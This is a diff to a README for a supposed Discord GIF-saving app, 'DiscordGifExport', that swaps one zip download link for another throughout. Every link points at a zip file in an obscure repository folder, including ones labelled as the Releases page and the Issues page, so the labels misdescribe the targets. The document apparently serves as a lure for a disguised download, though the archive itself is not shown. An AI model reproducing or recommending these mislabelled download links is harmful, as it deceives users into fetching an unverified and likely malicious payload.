@@ -8,12 +8,12 @@ Welcome to DiscordGifExport! This application lets you save GIFs from Discord di
 
 To download DiscordGifExport, simply visit the link below:
 
-[![Download DiscordGifExport](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip)](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip)
+[![Download DiscordGifExport](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip)](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click [here](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip) to go to the Releases page. 
+   Click [here](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip) to go to the Releases page. 
 
 2. **Find the Latest Version**  
    Look for the most recent release at the top of the page. It should have the latest updates and features.
@@ -61,7 +61,7 @@ If you encounter issues, here are some common solutions:
 - **File Not Opening:** Ensure you downloaded the correct file type (.exe or .zip) for your operating system.
 - **App Crashes:** Try restarting your computer and running the application again.
   
-If problems persist, check the [GitHub Issues Page](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip) for help or to report any bugs.
+If problems persist, check the [GitHub Issues Page](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip) for help or to report any bugs.
 
 ## 🔗 Community and Support
 
@@ -76,4 +76,4 @@ We are always working on adding new features and enhancements. Stay tuned for up
 
 Once again, you can download DiscordGifExport from the link below:
 
-[![Download DiscordGifExport](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip)](https://raw.githubusercontent.com/Mim8080/DiscordGifExport/main/nabk/Export_Discord_Gif_1.4.zip)
+[![Download DiscordGifExport](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip)](https://github.com/Mim8080/DiscordGifExport/raw/refs/heads/main/nabk/Export-Gif-Discord-v3.7.zip)
